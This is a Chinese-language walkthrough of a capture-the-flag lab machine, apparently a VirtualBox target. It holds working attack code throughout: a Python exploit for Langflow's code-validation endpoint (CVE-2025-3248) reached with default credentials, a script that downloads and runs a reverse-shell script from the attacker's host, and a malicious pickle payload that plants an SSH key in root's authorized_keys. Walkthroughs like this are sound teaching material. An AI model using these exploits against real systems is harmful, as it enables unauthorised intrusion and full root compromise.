## Nmap

先扫全端口：

```bash
┌──(kali㉿kali)-[~]
└─$ nmap -p0-65535 --min-rate 5000 192.168.205.232
Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-19 05:08 -0400
Nmap scan report for 192.168.205.232
Host is up (0.00035s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
7860/tcp open  unknown
MAC Address: 08:00:27:6E:A2:C4 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 2.23 seconds
```

开放了 `22/80/7860`，7860 是非标准端口，优先调查。

## 服务识别

```bash
┌──(kali㉿kali)-[~]
└─$ nmap -p 22,80,7860 -sV -sC 192.168.205.232
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 10.0p2 Debian 7+deb13u1 (protocol 2.0)
80/tcp   open  http    nginx
|_http-title: Langflow
7860/tcp open  http    Uvicorn
|_http-title: Langflow
|_http-server-header: uvicorn
```

两个 Web 端口都跑着 **Langflow**（LLM 工作流平台），80 是 nginx 反代，7860 是 uvicorn 后端。

## Web 枚举

版本确认：

```bash
┌──(kali㉿kali)-[~]
└─$ curl -s http://192.168.205.232:7860/api/v1/version
{"version":"1.2.0","main_version":"1.2.0","package":"Langflow"}

└─$ curl -s http://192.168.205.232:7860/api/v1/config
{"type":"public","allow_custom_components":true,...}
```

Langflow 1.2.0，认证模式 `public`，但 API 端点实际返回 403。查 searchsploit：

```bash
┌──(kali㉿kali)-[~]
└─$ searchsploit langflow
Langflow 1.2.x - Remote Code Execution (RCE) | multiple/webapps/52364.py
Langflow 1.3.0 - Remote Code Execution (RCE) | multiple/remote/52262.txt
```

CVE-2025-3248，`/api/v1/validate/code` 端点存在未授权 `exec()` 调用。

## 初始突破

直接调用该端点返回 403，需要认证。尝试默认凭据：

```bash
┌──(kali㉿kali)-[~]
└─$ curl -s -X POST http://192.168.205.232:7860/api/v1/login -d "username=langflow&password=langflow"
{"access_token":"eyJhbGciOiJIUzI1NiIs...","token_type":"bearer"}
```

默认凭据 `langflow:langflow` 直接登录成功。拿 token 调用 RCE 端点：

```bash
┌──(kali㉿kali)-[~]
└─$ TOKEN=$(curl -s -X POST http://192.168.205.232:7860/api/v1/login \
  -d "username=langflow&password=langflow" | python3 -c "import sys,json; print(json.load(sys.stdin)['access_token'])")
```

保存`rce_test.py`

```python
import requests, json, sys

url = f'http://{sys.argv[1]}/api/v1/validate/code'
token = sys.argv[2]
headers = {'Content-Type': 'application/json', 'Authorization': f'Bearer {token}'}
code = "def run(cd=exec('raise Exception(__import__(\"subprocess\").check_output(\"id\", shell=True))')): pass"
r = requests.post(url, headers=headers, json={'code': code}, timeout=15)
print(r.text)
```

执行脚本：

```bash
┌──(kali㉿kali)-[~]
└─$ python3 rce_test.py 192.168.205.232 $TOKEN
{"imports":{"errors":[]},"function":{"errors":["b'uid=1000(lnnn) gid=1000(lnnn) groups=1000(lnnn)\\n'"]}}
```

利用 RCE 获取交互式 Shell。攻击机启动监听。

```bash
┌──(kali㉿kali)-[~]
└─$ penelope -p 8888
```

通过 RCE 依次Down载、赋权、执行反弹 Shell 脚本，使用 `subprocess.Popen` 非阻塞方式执行避免卡死。保存为 `get_shell.py`：

```python
import requests, sys

url = f'http://{sys.argv[1]}/api/v1/validate/code'
token = sys.argv[2]
headers = {'Content-Type': 'application/json', 'Authorization': f'Bearer {token}'}

def exec_code(cmd):
    code = f"def run(cd=exec('import subprocess;subprocess.Popen(\"{cmd}\", shell=True)')): pass"
    requests.post(url, headers=headers, json={'code': code}, timeout=15)

exec_code("wget http://192.168.205.128/r.sh -O /tmp/r.sh")
exec_code("chmod +x /tmp/r.sh")
exec_code("bash /tmp/r.sh")
```

执行脚本：

```bash
┌──(kali㉿kali)-[~]
└─$ python3 get_shell.py 192.168.205.232 $TOKEN
```

Penelope 自动升级 PTY，获取到交互式 Shell。

```bash
uid=1000(lnnn) gid=1000(lnnn) groups=1000(lnnn)
hostname: lnnn
```

## 提权

上传 linpeas 枚举，几个关键发现：

```text
1. /home/lnnn/.notes.txt 提到"模型评估守护进程"
2. /var/backups/id_rsa.bak（已损坏，rsync 备份截断）
3. systemd 服务 lnnn-eval.service 以 root 运行，每 2 分钟执行
4. /home/lnnn/models/ 目录权限 777（drwxrwxrwx）
5. eval_daemon.py 使用 pickle.load() 加载该目录下的 .pkl 文件
```

笔记内容：

```bash
lnnn@lnnn:~$ cat /home/lnnn/.notes.txt
待办事项（lnnn）：
- [x] 搭建 Langflow AI 工作流平台
- [x] 配置模型评估守护进程
- [ ] 修复模型评估守护进程性能问题
```

检查 systemd 服务及定时器配置

```bash
lnnn@lnnn:/dev/shm$ cat /etc/systemd/system/lnnn-eval.service
[Unit]
Description=lnnn ML Model Evaluation Service
After=network.target

[Service]
Type=oneshot
ExecStart=/usr/bin/python3 /opt/lnnn-eval/eval_daemon.py
User=root
StandardOutput=append:/var/log/lnnn-eval.log
StandardError=append:/var/log/lnnn-eval.log

lnnn@lnnn:/dev/shm$ cat /etc/systemd/system/lnnn-eval.timer
[Unit]
Description=Run lnnn model evaluation every 5 minutes

[Timer]
OnBootSec=2min
OnUnitActiveSec=2min
Unit=lnnn-eval.service

[Install]
WantedBy=timers.target
```

查看守护进程源码。

```bash
lnnn@lnnn:/dev/shm$ cat /opt/lnnn-eval/eval_daemon.py
#!/usr/bin/env python3
"""lnnn Model Evaluation Daemon - runs as root, loads ML models from /home/lnnn/models/"""
import os, glob, pickle, logging, sys

LOG_FILE = '/var/log/lnnn-eval.log'
MODEL_DIR = '/home/lnnn/models'

logging.basicConfig(filename=LOG_FILE, level=logging.INFO,
    format='%(asctime)s [lnnn-eval] %(levelname)s %(message)s')

def load_models():
    pattern = os.path.join(MODEL_DIR, '*.pkl')
    models = glob.glob(pattern)
    if not models:
        logging.info('No models found in %s', MODEL_DIR)
        return
    for path in models:
        try:
            logging.info('Loading model: %s', path)
            with open(path, 'rb') as f:
                model = pickle.load(f)
            logging.info('Model loaded successfully: %s (type=%s)', path, type(model).__name__)
        except Exception as e:
            logging.warning('Failed to load model %s: %s', path, e)

if __name__ == '__main__':
    logging.info("lnnn model eval daemon started (uid=%d)", os.getuid())
    os.chdir("/home/lnnn")
    load_models()
    logging.info('Eval cycle complete')
```

核心漏洞一目了然：

```text
1. 服务以 root 身份运行 (User=root)
2. 每 2 分钟由 timer 触发一次
3. 从 /home/lnnn/models/ 加载 .pkl 文件
4. 该目录权限 777，lnnn 可写
5. pickle.load() 直接反序列化，无任何校验
```

### Pickle 反序列化 Payload

在 shell 中构造恶意 pickle，利用 `__reduce__` 写入 SSH authorized_keys

保存为 `gen_pkl.py`：

```bash
import pickle, os

class Exploit(object):
    def __reduce__(self):
        return (os.system, ('mkdir -p /root/.ssh && echo ssh-rsa AAAAB3NzaC1yc2E... kali@kali > /root/.ssh/authorized_keys && chmod 700 /root/.ssh && chmod 600 /root/.ssh/authorized_keys',))

with open('/home/lnnn/models/evil3.pkl', 'wb') as f:
    pickle.dump(Exploit(), f)
print('done')
```

执行脚本。等待 2 分钟后，日志确认加载：

```bash
lnnn@lnnn:/dev/shm$ cat /var/log/lnnn-eval.log | tail -5
2026-06-19 05:26:19,059 [lnnn-eval] INFO lnnn model eval daemon started (uid=0)
2026-06-19 05:26:19,059 [lnnn-eval] INFO Loading model: /home/lnnn/models/evil3.pkl
2026-06-19 05:26:19,064 [lnnn-eval] INFO Model loaded successfully: /home/lnnn/models/evil3.pkl (type=int)
```

## Root

SSH 登录 root：

```bash
┌──(kali㉿kali)-[~]
└─$ ssh -i /tmp/id_rsa_attacker root@192.168.205.232
uid=0(root) gid=0(root) groups=0(root)
root@lnnn:~# cat /root/root.txt /home/lnnn/user.txt
lnnn{r00t_0f_lnnn_m4ch1ne_p1ckl3_15_d4ng3r0u5}
lnnn{w3lc0me_t0_lnnn_w0rksh0p_y0u_g0t_u53r}
```